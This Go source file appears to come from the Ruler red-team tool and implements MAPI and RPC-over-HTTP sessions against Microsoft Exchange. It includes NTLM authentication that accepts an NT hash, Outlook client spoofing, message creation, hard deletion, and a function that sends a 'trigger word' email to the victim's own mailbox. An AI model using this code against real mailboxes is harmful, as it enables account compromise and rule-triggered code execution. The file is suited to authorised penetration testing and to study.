package mapi

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"runtime"
	"time"

	"github.com/sensepost/ruler/http-ntlm"
	"github.com/sensepost/ruler/rpc-http"
	"github.com/sensepost/ruler/utils"
)

//HTTP transport type for MAPI over HTTP types
const HTTP int = 1

//RPC over HTTP transport type for traditional MAPI
const RPC int = 2

var cnt = 0

//AuthSession a
var AuthSession *utils.Session

//ExtractMapiURL extract the External mapi url from the autodiscover response
func ExtractMapiURL(resp *utils.AutodiscoverResp) string {
	for _, v := range resp.Response.Account.Protocol {
		if v.TypeAttr == "mapiHttp" {
			return v.MailStore.ExternalUrl
		}
	}
	return ""
}

//ExtractRPCURL extract the External RPC url from the autodiscover response
func ExtractRPCURL(resp *utils.AutodiscoverResp) string {
	for _, v := range resp.Response.Account.Protocol {
		if v.TypeAttr == "rpcHttp" {
			return v.MailStore.ExternalUrl
		}
	}
	return ""
}

//Init is used to start our mapi session
func Init(config *utils.Session, lid, URL, ABKURL string, transport int) {
	AuthSession = config
	AuthSession.LID = lid
	AuthSession.CookieJar, _ = cookiejar.New(nil)
	if transport == HTTP {
		AuthSession.URL, _ = url.Parse(URL)
		AuthSession.ABKURL, _ = url.Parse(ABKURL)
	} else {
		AuthSession.Host = URL
	}
	AuthSession.Transport = transport
	AuthSession.ClientSet = false
	AuthSession.ReqCounter = 1
	AuthSession.LogonID = 0x09
	AuthSession.Authenticated = false

	if AuthSession.RPCEncrypt == true {
		AuthSession.RPCNetworkAuthLevel = rpchttp.RPC_C_AUTHN_LEVEL_PKT_PRIVACY
		AuthSession.RPCNetworkAuthType = rpchttp.RPC_C_AUTHN_WINNT
	} else {
		AuthSession.RPCNetworkAuthLevel = rpchttp.RPC_C_AUTHN_LEVEL_NONE
		AuthSession.RPCNetworkAuthType = rpchttp.RPC_C_AUTHN_NONE
	}
}

func addMapiHeaders(req *http.Request, mapiType string) {
	AuthSession.ReqCounter++
	req.Header.Add("Content-Type", "application/mapi-http")
	req.Header.Add("X-RequestType", mapiType)
	req.Header.Add("X-User-Identity", AuthSession.Email)
	req.Header.Add("X-RequestId", fmt.Sprintf("{C715155F-2BE8-44E0-BD34-2960065754C8}:%d", AuthSession.ReqCounter))
	req.Header.Add("X-ClientInfo", "{2F94A2BF-A2E6-4CCC-BF98-B5F22C542226}")
	req.Header.Add("X-ClientApplication", "Outlook/15.0.4815.1002")
}

func sendMapiRequest(mapiType string, mapi ExecuteRequest) ([]byte, error) {
	if AuthSession.Transport == HTTP {
		return mapiRequestHTTP(AuthSession.URL.String(), mapiType, mapi.Marshal())
	}
	return mapiRequestRPC(mapi)
}

func sendMapiConnectRequestHTTP(mapi ConnectRequest) ([]byte, error) {
	return mapiRequestHTTP(AuthSession.URL.String(), "Connect", mapi.Marshal())
}

func sendMapiDisconnect(mapi DisconnectRequest) ([]byte, error) {
	if AuthSession.Transport == HTTP {
		return mapiRequestHTTP(AuthSession.URL.String(), "Disconnect", mapi.Marshal())
	}
	return mapiDisconnectRPC()
}

//func sendMapiConnectHTTP(mapi Conn)
//mapiAuthRequest connects and authenticates using NTLM or basic auth.
//After the authentication is complete, we can simply use the mapiRequest
//and the session cookies.
func mapiRequestHTTP(URL, mapiType string, body []byte) ([]byte, error) {
	if AuthSession.ClientSet == false {
		AuthSession.Client = http.Client{
			Transport: &httpntlm.NtlmTransport{
				Domain:   AuthSession.Domain,
				User:     AuthSession.User,
				Password: AuthSession.Pass,
				NTHash:   AuthSession.NTHash,
				Insecure: AuthSession.Insecure,
			},
			Jar: AuthSession.CookieJar,
		}
		AuthSession.ClientSet = true
	}

	req, err := http.NewRequest("POST", URL, bytes.NewReader(body))
	addMapiHeaders(req, mapiType)
	req.SetBasicAuth(AuthSession.Email, AuthSession.Pass)

	//request the auth url
	resp, err := AuthSession.Client.Do(req)

	if err != nil {
		//check if this error was because of ntml auth when basic auth was expected.
		if m, _ := regexp.Match("illegal base64", []byte(err.Error())); m == true {
			AuthSession.Client = http.Client{Jar: AuthSession.CookieJar}
			resp, err = AuthSession.Client.Do(req)
		} else {
			fmt.Println(err)
			return nil, nil
		}
	}
	rbody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err)
		return nil, nil
	}
	responseBody, err := readResponse(resp.Header, rbody)
	return responseBody, err
}

func mapiConnectRPC(body ConnectRequestRPC) ([]byte, error) {
	rpchttp.AuthSession = AuthSession
	ready := make(chan bool)      //this is our ready channel,
	chanError := make(chan error) //get the error message from our channel setup

	//we should add a channel to check if there was an error setting up the channels
	//there will currently be a deadlock here if something goes wrong
	go rpchttp.RPCOpen(AuthSession.RPCURL, ready, chanError)

	if AuthSession.Verbose {
		fmt.Println("[+] Setting up channels")
	}
	//wait for channels to be setup
	if v := <-ready; v == false { //check if the setup was successful or premission Denied
		e := <-chanError
		return nil, fmt.Errorf("[x] Couldn't setup RPC channel - %s", e)
	}

	fmt.Println("[+] Binding to RPC")
	//bind to RPC
	if err := rpchttp.RPCBind(); err != nil {
		return nil, err
	}

	//AUXBuffer containing client info. Technically the server doesn't process this. But my messages don't work without it.. so meh
	auxbuf := rpchttp.AUXBuffer{}
	auxbuf.RPCHeader = rpchttp.RPCHeader{Version: 0x0000, Flags: 0x04}

	clientInfo := rpchttp.AUXPerfClientInfo{AdapterSpeed: 0x000186a0, ClientID: 0x0001, AdapterNameOffset: 0x0020, ClientMode: 0x0001, MachineName: utils.UniString("Ethernet 2")}
	clientInfo.Header = rpchttp.AUXHeader{Version: 0x01, Type: 0x02}
	clientInfo.Header.Size = uint16(len(clientInfo.Marshal()))

	accountInfo := rpchttp.AUXPerfAccountInfo{ClientID: 0x0001, Account: rpchttp.CookieGen()}
	accountInfo.Header = rpchttp.AUXHeader{Version: 0x01, Type: 0x18}
	accountInfo.Header.Size = uint16(len(accountInfo.Marshal()))

	sessionInfo := rpchttp.AUXTypePerfSessionInfo{SessionID: 0x0001, SessionGUID: rpchttp.CookieGen(), ConnectionID: 0x00000001b}
	sessionInfo.Header = rpchttp.AUXHeader{Version: 0x02, Type: 0x04}
	sessionInfo.Header.Size = uint16(len(sessionInfo.Marshal()))

	processInfo := rpchttp.AUXTypePerfProcessInfo{ProcessID: 0x01, ProcessGUID: rpchttp.CookieGen(), ProcessNameOffset: 0x004f, ProcessName: utils.UniString("OUTLOOK.EXE")}
	processInfo.Header = rpchttp.AUXHeader{Version: 0x02, Type: 0x0b}
	processInfo.Header.Size = uint16(len(processInfo.Marshal()))

	clientConnInfo := rpchttp.AUXClientConnectionInfo{ConnectionGUID: rpchttp.CookieGen(), ConnectionAttempts: 0x02, ConnectionFlags: 0x00, ConnectionContextInfo: utils.UniString("")}
	clientConnInfo.Header = rpchttp.AUXHeader{Version: 0x01, Type: 0x4a}
	clientConnInfo.Header.Size = uint16(len(clientConnInfo.Marshal()))

	auxbuf.Buff = []rpchttp.AuxInfo{clientInfo, accountInfo, sessionInfo, processInfo, clientConnInfo}

	auxbuf.RPCHeader.Size = uint16(len(auxbuf.Marshal()) - 10) //account for header size
	auxbuf.RPCHeader.SizeActual = auxbuf.RPCHeader.Size

	body.AuxilliaryBuf = auxbuf.Marshal()
	body.AuxilliaryBufSize = uint32(len(body.AuxilliaryBuf) - 2)

	resp, err := rpchttp.DoConnectExRequest(body.Marshal(), body.AuxilliaryBufSize)
	AuthSession.RPCSet = true

	return resp, err

}

func mapiDisconnectRPC() ([]byte, error) {
	rpchttp.RPCDisconnect()
	return nil, nil
}

//mapiRequestRPC to our target. Takes the mapiType (Connect, Execute) to determine the
//action performed on the server side
func mapiRequestRPC(body ExecuteRequest) ([]byte, error) {

	var resp []byte
	var err error

	//Don't really need the auxbuffer but it works if it's here and not if I take it out
	auxbuf := rpchttp.AUXBuffer{}
	auxbuf.RPCHeader = rpchttp.RPCHeader{Version: 0x0000, Flags: 0x04}

	requestID := rpchttp.AUXTypePerfRequestID{SessionID: 0x01, RequestID: 0x0b}
	requestID.Header = rpchttp.AUXHeader{Version: 0x01, Type: 0x01}
	requestID.Header.Size = uint16(len(requestID.Marshal()))

	auxbuf.Buff = []rpchttp.AuxInfo{requestID}

	auxbuf.RPCHeader.Size = uint16(len(auxbuf.Marshal()) - 10) //account for header size
	auxbuf.RPCHeader.SizeActual = auxbuf.RPCHeader.Size
	//fmt.Println("Len of body: ", uint32(len(utils.BodyToBytes(body.RopBuffer))))

	//byte align here again
	length := uint32(len(utils.BodyToBytes(body.RopBuffer)))
	pad := (4 - length%4) % 4
	body.RopBuffer.ROP.ServerObjectHandleTable = append(body.RopBuffer.ROP.ServerObjectHandleTable, bytes.Repeat([]byte{0x00}, int(pad))...)

	body.RPCPtr = []byte{0x70, 0x80, 0x00, 0x00}
	body.MaxRopOut = length

	body.AuxilliaryBuf = auxbuf.Marshal()
	body.AuxilliaryBufSize = uint32(len(body.AuxilliaryBuf) - 2)

	//use RPC marshal for the body to ensure the sizes are calculated to take into account the 4-byte alignment padding
	resp, err = rpchttp.EcDoRPCExt2(body.MarshalRPC(), body.AuxilliaryBufSize)
	//fmt.Printf("%x\n", resp)
	//we should do some proper responses here, rather than simply skipping 44 bytes ahead
	return resp, err
}

//switchEndian is used to change from BigEndian to LittleEndian when we need to
//pad out the RPCPtr to ensure 4-byte alignment
func switchEndian(val uint32) uint32 {
	byteNum := new(bytes.Buffer)
	var num uint32
	binary.Write(byteNum, binary.BigEndian, val)
	binary.Read(byteNum, binary.LittleEndian, &num)
	return num
}

//isAuthenticated checks if we have a session
func isAuthenticated() {
	if AuthSession.CookieJar.Cookies(AuthSession.URL) == nil {
		fmt.Println("[x] No authentication cookies found. You may not be authenticated.")
		fmt.Println("[*] Trying to authenticate you")
		Authenticate()
	}
}

func specialFolders(folderResponse []byte) {
	AuthSession.Folderids = make([][]byte, 13)
	cnt := 0
	for k := 0; k < 13; k++ {
		AuthSession.Folderids[k] = folderResponse[cnt : cnt+8]
		cnt += 8
	}
}

func readResponse(headers http.Header, body []byte) ([]byte, error) {
	//check to see that the response code was 0, which indicates protocol success
	if headers.Get("X-ResponseCode") != "0" {
		return nil, fmt.Errorf("Got a protocol error response: %s", headers.Get("X-ResponseCode"))
	}
	//We need to parse out the body to get rid of the meta-tags and additional headers (if any)
	// <META-TAGS>
	// <ADDITIONAL HEADERS>
	// <RESPONSE BODY>
	//we need to check the meta-tags to see if it is PROCESSING, PENDING or DONE
	//DONE means we don't need to fetch more data

	start := bytes.Index(body, []byte{0x0D, 0x0A, 0x0D, 0x0A})
	return body[start+4:], nil
}

//Authenticate is used to create the MAPI session, get's session cookie ect
func Authenticate() (*RopLogonResponse, error) {
	if AuthSession.Transport == RPC {
		return AuthenticateRPC()
	}
	return AuthenticateHTTP()
}

//AuthenticateRPC does RPC version of authenticate
func AuthenticateRPC() (*RopLogonResponse, error) {
	connRequest := ConnectRequestRPC{}

	connRequest.UserDN = []byte(AuthSession.LID)
	//check that UserDN aligns to 4 byte boundary
	pad := (4 - len(connRequest.UserDN)%4) % 4

	if pad == 0 {
		connRequest.UserDN = append(connRequest.UserDN, bytes.Repeat([]byte{0x00}, 4)...)
	} else {
		connRequest.UserDN = append(connRequest.UserDN, bytes.Repeat([]byte{0x00}, int(pad))...)
	}

	connRequest.DNLen = uint32(len(connRequest.UserDN))
	connRequest.DNLenActual = connRequest.DNLen
	if AuthSession.Admin == true {
		connRequest.Flags = uFlagsAdmin
	} else {
		connRequest.Flags = uFlagsUser
	}

	connRequest.DNHash = hash(AuthSession.LID) //[]byte{0x32, 0x02, 0x03, 0x77} //7f 6f 24 b0
	connRequest.CbLimit = 0x00
	connRequest.DefaultCodePage = 1252
	connRequest.LcidSort = 1033
	connRequest.LcidString = 1033
	connRequest.IcxrLink = 0xFFFFFFFF
	connRequest.FCanConvertCodePage = 0x1
	connRequest.ClientVersion = []byte{0x0f, 0x00, 0x03, 0x13, 0xe8, 0x03}
	connRequest.TimeStamp = 0x00

	_, err := mapiConnectRPC(connRequest)

	if err != nil {
		return nil, fmt.Errorf("[x] An error occurred setting up RPC.\n%s", err)
	}

	//Here we should check if the login worked

	fmt.Println("[+] User DN: ", string(connRequest.UserDN))
	fmt.Println("[*] Got Context, Doing ROPLogin")

	AuthSession.UserDN = append([]byte(AuthSession.LID), []byte{0x00}...)
	return AuthenticateFetchMailbox(AuthSession.UserDN) //connRequest.UserDN)

}

//AuthenticateHTTP does the authenctication, seems like RPC/HTTP and MAPI/HTTP has slightly different auths
func AuthenticateHTTP() (*RopLogonResponse, error) {
	connRequest := ConnectRequest{}

	connRequest.UserDN = []byte(AuthSession.LID)
	connRequest.UserDN = append(connRequest.UserDN, []byte{0x00}...) //append nullbyte
	if AuthSession.Admin == true {
		connRequest.Flags = uFlagsAdmin
	} else {
		connRequest.Flags = uFlagsUser
	}

	connRequest.DefaultCodePage = 1252
	connRequest.LcidSort = 1033
	connRequest.LcidString = 1033

	responseBody, err := sendMapiConnectRequestHTTP(connRequest)

	if err != nil {
		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
	}
	connResponse := ConnectResponse{}
	connResponse.Unmarshal(responseBody)

	if connResponse.StatusCode == 0 {
		fmt.Println("[+] User DN: ", string(connRequest.UserDN))
		fmt.Println("[*] Got Context, Doing ROPLogin")

		AuthSession.UserDN = connRequest.UserDN
		return AuthenticateFetchMailbox(connRequest.UserDN)
	}

	return nil, fmt.Errorf("[x] An Unspecified error occurred")
}

//AuthenticateFetchMailbox func to perform step two of the authentication process
func AuthenticateFetchMailbox(essdn []byte) (*RopLogonResponse, error) {

	execRequest := ExecuteRequest{}
	execRequest.Init()

	logonBody := RopLogonRequest{RopID: 0xFE, LogonID: AuthSession.LogonID}
	logonBody.OutputHandleIndex = 0x00
	logonBody.LogonFlags = 0x01
	if AuthSession.Admin == true {
		logonBody.OpenFlags = UseAdminPrivilege | TakeOwnership | UserPerMdbReplidMapping
	} else {
		logonBody.OpenFlags = UserPerMdbReplidMapping | HomeLogon | TakeOwnership //[]byte{0x0C, 0x04, 0x00, 0x21}
	}
	logonBody.StoreState = 0
	logonBody.Essdn = essdn
	logonBody.EssdnSize = uint16(len(logonBody.Essdn))
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0xFF, 0xFF, 0xFF, 0xFF}
	execRequest.RopBuffer.ROP.RopsList = logonBody.Marshal()
	//fmt.Printf("\n\nLogon: %x \n%x\n", logonBody.Marshal(), execRequest.Marshal())
	responseBody, err := sendMapiRequest("Execute", execRequest)

	if err != nil {
		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
	}

	execResponse := ExecuteResponse{}
	execResponse.Unmarshal(responseBody)

	if execResponse.StatusCode == 0 {
		AuthSession.Authenticated = true

		logonResponse := RopLogonResponse{}
		logonResponse.Unmarshal(execResponse.RopBuffer)
		specialFolders(logonResponse.FolderIds)
		return &logonResponse, nil
	}
	if AuthSession.Admin {
		return nil, fmt.Errorf("[x] Invalid logon. Admin privileges requested but user is not admin")
	}

	return nil, fmt.Errorf("[x]Unspecified error occurred\n")
}

//Disconnect function to be nice and disconnect us from the server
//This is strictly necessary but hey... lets follow protocol
func Disconnect() (int, error) {
	fmt.Println("[*] And disconnecting from server")

	disconnectBody := DisconnectRequest{}
	disconnectBody.AuxilliaryBufSize = 0

	_, err := sendMapiDisconnect(disconnectBody)

	if err != nil {
		return -1, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
	}

	return 0, nil
}

//ReleaseObject issues a RopReleaseRequest to free a server handle to an object
func ReleaseObject(inputHandle byte) (*RopReleaseResponse, error) {
	execRequest := ExecuteRequest{}
	execRequest.Init()
	ropRelease := RopReleaseRequest{RopID: 0x01, LogonID: AuthSession.LogonID, InputHandle: inputHandle}
	fullReq := ropRelease.Marshal()
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF}
	execRequest.RopBuffer.ROP.RopsList = fullReq

	responseBody, err := sendMapiRequest("Execute", execRequest)

	if err != nil {
		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
	}
	execResponse := ExecuteResponse{}
	execResponse.Unmarshal(responseBody)

	if execResponse.StatusCode == 0 {
		ropReleaseResponse := RopReleaseResponse{}
		_, err = ropReleaseResponse.Unmarshal(execResponse.RopBuffer[10:])
		if err != nil {
			return nil, err
		}
		return &ropReleaseResponse, nil
	}

	return nil, fmt.Errorf("[x] Unknown error occurred or empty response")
}

//SendMessage func to create a new message on the Exchange server
//and then sends an email to the target using their own email
func SendMessage(triggerWord string) (*RopSubmitMessageResponse, error) {

	execRequest := ExecuteRequest{}
	execRequest.Init()

	createMessage := RopCreateMessageRequest{RopID: 0x06, LogonID: AuthSession.LogonID}
	createMessage.InputHandle = 0x00
	createMessage.OutputHandle = 0x01
	createMessage.FolderID = AuthSession.Folderids[OUTBOX]
	createMessage.CodePageID = 0xFFF
	createMessage.AssociatedFlag = 0

	fullReq := createMessage.Marshal()

	setProperties := RopSetPropertiesRequest{RopID: 0x0A, LogonID: AuthSession.LogonID}
	setProperties.InputHandle = 0x01
	setProperties.PropertValueCount = 8

	propertyTags := make([]TaggedPropertyValue, setProperties.PropertValueCount)
	propertyTags[0] = TaggedPropertyValue{PidTagBody, utils.UniString("This is the body.\n\r")}
	propertyTags[1] = TaggedPropertyValue{PropertyTag{PtypString, 0x001A}, utils.UniString("IPM.Note")}
	propertyTags[2] = TaggedPropertyValue{PidTagMessageFlags, []byte{0x00, 0x00, 0x00, 0x08}} //unsent
	propertyTags[3] = TaggedPropertyValue{PidTagConversationTopic, utils.UniString(triggerWord)}
	propertyTags[4] = PidTagIconIndex
	propertyTags[5] = PidTagMessageEditorFormat
	propertyTags[5] = TaggedPropertyValue{PidTagNativeBody, []byte{0x00, 0x00, 0x00, 0x01}}
	propertyTags[6] = TaggedPropertyValue{PidTagSubject, utils.UniString(triggerWord)}
	propertyTags[7] = TaggedPropertyValue{PidTagNormalizedSubject, utils.UniString(triggerWord)}

	setProperties.PropertyValues = propertyTags
	propertySize := 0
	for _, p := range propertyTags {
		propertySize += len(utils.BodyToBytes(p))
	}

	setProperties.PropertValueSize = uint16(propertySize + 2)

	fullReq = append(fullReq, setProperties.Marshal()...)

	modRecipients := RopModifyRecipientsRequest{RopID: 0x0E, LogonID: AuthSession.LogonID, InputHandle: 0x01}
	modRecipients.ColumnCount = 8
	modRecipients.RecipientColumns = make([]PropertyTag, modRecipients.ColumnCount)

	modRecipients.RecipientColumns[0] = PidTagObjectType
	modRecipients.RecipientColumns[1] = PidTagDisplayType
	//modRecipients.RecipientColumns[2] = PidTagSMTPAddress
	modRecipients.RecipientColumns[2] = PidTagEmailAddress
	modRecipients.RecipientColumns[3] = PidTagSendInternetEncoding
	modRecipients.RecipientColumns[4] = PidTagDisplayTypeEx
	modRecipients.RecipientColumns[5] = PidTagRecipientDisplayName
	modRecipients.RecipientColumns[6] = PidTagRecipientFlags
	modRecipients.RecipientColumns[7] = PidTagRecipientTrackStatus

	modRecipients.RowCount = 0x0001

	modRecipients.RecipientRows = make([]ModifyRecipientRow, modRecipients.RowCount)
	modRecipients.RecipientRows[0] = ModifyRecipientRow{RowID: 0x00000001, RecipientType: 0x00000001}
	modRecipients.RecipientRows[0].RecipientRow = RecipientRow{}
	modRecipients.RecipientRows[0].RecipientRow.RecipientFlags = 0x0008 | 0x0003 | 0x0200 | 0x0010 | 0x3 | 0x0020 //| 0x0040 //| 0x0010 // | (0x1) | 0x0400 | 0x0200 //0x0651 //0x0040 | 0x0010 | 0x1007 | 0x0400 | 0x0100 //email address and display name
	//modRecipients.RecipientRows[0].RecipientRow.AddressPrefixUsed = 0x5A
	//modRecipients.RecipientRows[0].RecipientRow.DisplayType = 0x00
	modRecipients.RecipientRows[0].RecipientRow.EmailAddress = utils.UniString(AuthSession.Email) //email address and display name
	modRecipients.RecipientRows[0].RecipientRow.DisplayName = utils.UniString("Self")             //email address and display name
	modRecipients.RecipientRows[0].RecipientRow.SimpleDisplayName = utils.UniString("Self")       //email address and display name
	modRecipients.RecipientRows[0].RecipientRow.RecipientColumnCount = modRecipients.ColumnCount

	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties = StandardPropertyRow{Flag: 0x00}

	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray = make([][]byte, modRecipients.RecipientRows[0].RecipientRow.RecipientColumnCount)
	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[0] = []byte{0x06, 0x00, 0x00, 0x00}
	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[1] = []byte{0x00, 0x00, 0x00, 0x00}
	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[2] = utils.UniString(AuthSession.Email)
	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[3] = []byte{0x00, 0x00, 0x00, 0x00}
	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[4] = []byte{0x00, 0x00, 0x00, 0x40}
	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[5] = utils.UniString("Self")
	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[6] = []byte{0x01, 0x00, 0x00, 0x00}
	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[7] = []byte{0x00, 0x00, 0x00, 0x00}

	modRecipients.RecipientRows[0].RecipientRowSize = uint16(len(utils.BodyToBytes(modRecipients.RecipientRows[0].RecipientRow)))
	fullReq = append(fullReq, modRecipients.Marshal()...)

	//submitMessage := RopSubmitMessageRequest{RopID: 0x32, LogonID: AuthSession.LogonID, InputHandle: 0x02, SubmitFlags: 0x00}
	//fullReq = append(fullReq, submitMessage.Marshal()...)
	submitMessage := RopSubmitMessageRequest{RopID: 0x32, LogonID: AuthSession.LogonID, InputHandle: 0x01, SubmitFlags: 0x00}
	fullReq = append(fullReq, submitMessage.Marshal()...)

	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
	execRequest.RopBuffer.ROP.RopsList = fullReq

	responseBody, err := sendMapiRequest("Execute", execRequest)

	if err != nil {
		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
	}
	execResponse := ExecuteResponse{}
	execResponse.Unmarshal(responseBody)

	if execResponse.StatusCode == 0 {

		bufPtr := 10

		createMessageResponse := RopCreateMessageResponse{}

		p, e := createMessageResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
		if e != nil {
			return nil, fmt.Errorf("[x]An error occurred %s\n", e)
		}
		bufPtr += p

		propertiesResponse := RopSetPropertiesResponse{}
		p, e = propertiesResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
		if e != nil {
			return nil, fmt.Errorf("[x]An error occurred %s\n", e)
		}

		bufPtr += p
		modRecipients := RopModifyRecipientsResponse{}
		p, e = modRecipients.Unmarshal(execResponse.RopBuffer[bufPtr:])
		bufPtr += p
		if e != nil {
			return nil, fmt.Errorf("[x]An error occurred %s\n", e)
		}

		submitMessageResp := RopSubmitMessageResponse{}
		_, err = submitMessageResp.Unmarshal(execResponse.RopBuffer[bufPtr:])
		if err != nil {
			return nil, fmt.Errorf("[x]An error occurred %s\n", e)
		}

		return &submitMessageResp, nil
	}

	return nil, fmt.Errorf("[x]Unspecified error occurred\n")
}

//SetMessageStatus is used to create a message on the exchange server
func SetMessageStatus(folderid, messageid []byte) (*RopSetMessageStatusResponse, error) {
	execRequest := ExecuteRequest{}
	execRequest.Init()

	getFolder := RopOpenFolderRequest{RopID: 0x02, LogonID: AuthSession.LogonID}
	getFolder.InputHandle = 0x00
	getFolder.OutputHandle = 0x01
	getFolder.FolderID = folderid
	getFolder.OpenModeFlags = 0x00

	fullReq := getFolder.Marshal()

	setMessageStatus := RopSetMessageStatusRequest{RopID: 0x20, LogonID: AuthSession.LogonID}
	setMessageStatus.InputHandle = 0x01
	setMessageStatus.MessageID = messageid
	setMessageStatus.MessageStatusFlags = PidTagMessageFlags
	setMessageStatus.MessageStatusMask = MSRemoteDelete

	fullReq = append(fullReq, setMessageStatus.Marshal()...)

	ropRelease := RopReleaseRequest{RopID: 0x01, LogonID: AuthSession.LogonID, InputHandle: 0x01}
	fullReq = append(fullReq, ropRelease.Marshal()...)

	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
	execRequest.RopBuffer.ROP.RopsList = fullReq

	responseBody, err := sendMapiRequest("Execute", execRequest)

	if err != nil {
		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
	}
	execResponse := ExecuteResponse{}
	execResponse.Unmarshal(responseBody)

	if execResponse.StatusCode == 0 {
		bufPtr := 10

		setStatusResp := RopSetMessageStatusResponse{}

		_, e := setStatusResp.Unmarshal(execResponse.RopBuffer[bufPtr:])
		if e != nil {
			return nil, fmt.Errorf("[x]An error occurred %s\n", e)
		}
		return &setStatusResp, nil
	}

	return nil, fmt.Errorf("[x]Unspecified error occurred\n")

}

//CreateMessage is used to create a message on the exchange server
func CreateMessage(folderID []byte, properties []TaggedPropertyValue) (*RopSaveChangesMessageResponse, error) {
	execRequest := ExecuteRequest{}
	execRequest.Init()

	createMessage := RopCreateMessageRequest{RopID: 0x06, LogonID: AuthSession.LogonID}
	createMessage.InputHandle = 0x00
	createMessage.OutputHandle = 0x01
	createMessage.FolderID = folderID
	createMessage.CodePageID = 0xFFF
	createMessage.AssociatedFlag = 0

	fullReq := createMessage.Marshal()

	setProperties := RopSetPropertiesRequest{RopID: 0x0A, LogonID: AuthSession.LogonID}
	setProperties.InputHandle = 0x01
	setProperties.PropertValueCount = uint16(len(properties))

	propertyTags := properties

	setProperties.PropertyValues = propertyTags
	propertySize := 0
	for _, p := range propertyTags {
		propertySize += len(utils.BodyToBytes(p))
	}

	setProperties.PropertValueSize = uint16(propertySize + 2)

	fullReq = append(fullReq, setProperties.Marshal()...)

	saveMessage := RopSaveChangesMessageRequest{RopID: 0x0C, LogonID: AuthSession.LogonID}
	saveMessage.ResponseHandleIndex = 0x02
	saveMessage.InputHandle = 0x01
	saveMessage.SaveFlags = 0x02

	fullReq = append(fullReq, saveMessage.Marshal()...)

	ropRelease := RopReleaseRequest{RopID: 0x01, LogonID: AuthSession.LogonID, InputHandle: 0x01}
	fullReq = append(fullReq, ropRelease.Marshal()...)

	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
	execRequest.RopBuffer.ROP.RopsList = fullReq

	responseBody, err := sendMapiRequest("Execute", execRequest)

	if err != nil {
		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
	}
	execResponse := ExecuteResponse{}
	execResponse.Unmarshal(responseBody)

	if execResponse.StatusCode == 0 {
		bufPtr := 10

		createMessageResponse := RopCreateMessageResponse{}

		p, e := createMessageResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
		if e != nil {
			return nil, fmt.Errorf("[x]An error occurred %s\n", e)
		}
		bufPtr += p

		propertiesResponse := RopSetPropertiesResponse{}
		p, e = propertiesResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
		if e != nil {
			return nil, fmt.Errorf("[x]An error occurred %s\n", e)
		}

		bufPtr += p

		saveMessageResponse := RopSaveChangesMessageResponse{}
		saveMessageResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])

		if err != nil {
			return nil, err
		}
		return &saveMessageResponse, nil
	}

	return nil, fmt.Errorf("[x]Unspecified error occurred\n")
}

//DeleteMessages is used to create a message on the exchange server
func DeleteMessages(folderid []byte, messageIDCount int, messageIDs []byte) (*RopDeleteMessagesResponse, error) {
	execRequest := ExecuteRequest{}
	execRequest.Init()

	getFolder := RopOpenFolderRequest{RopID: 0x02, LogonID: AuthSession.LogonID}
	getFolder.InputHandle = 0x00
	getFolder.OutputHandle = 0x01
	getFolder.FolderID = folderid
	getFolder.OpenModeFlags = 0x00

	fullReq := getFolder.Marshal()
	//Normal delete 0x1E, hard-delete 0x91
	deleteMessages := RopDeleteMessagesRequest{RopID: 0x91, LogonID: AuthSession.LogonID}
	deleteMessages.InputHandle = 0x01
	deleteMessages.WantSynchronous = 255
	deleteMessages.NotifyNonRead = 0
	deleteMessages.MessageIDCount = uint16(messageIDCount)
	deleteMessages.MessageIDs = messageIDs

	fullReq = append(fullReq, deleteMessages.Marshal()...)

	ropRelease := RopReleaseRequest{RopID: 0x01, LogonID: AuthSession.LogonID, InputHandle: 0x01}
	fullReq = append(fullReq, ropRelease.Marshal()...)

	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
	execRequest.RopBuffer.ROP.RopsList = fullReq

	responseBody, err := sendMapiRequest("Execute", execRequest)

	if err != nil {
		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
	}
	execResponse := ExecuteResponse{}
	execResponse.Unmarshal(responseBody)

	if execResponse.StatusCode == 0 {
		bufPtr := 10
		openFolder := RopOpenFolderResponse{}
